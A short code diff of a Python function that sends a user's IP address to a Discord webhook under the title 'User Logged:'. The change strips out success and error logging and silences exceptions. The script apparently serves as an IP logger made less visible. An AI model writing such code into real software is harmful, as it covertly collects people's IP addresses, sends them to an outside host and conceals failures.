@@ -18,15 +18,9 @@ def send_to_webhook(webhook_url, ip_address):
     try:
         embed = {"title": "User Logged:", "description": f"User IP Address: {ip_address}", "timestamp": datetime.datetime.utcnow().isoformat(), "color": 16711680}
         data = {"embeds": [embed]}
-
         response = requests.post(webhook_url, json=data)
-        
-        if response.status_code == 204:
-            logging.info("Data sent successfully to Discord webhook.")
-        else:
-            logging.error("Failed to send data to Discord webhook. Status code: %d", response.status_code)
     except Exception as e:
-        logging.error("Error sending data to Discord webhook: %s", e)
+        pass
 
 if __name__ == "__main__":
     setup_logging()
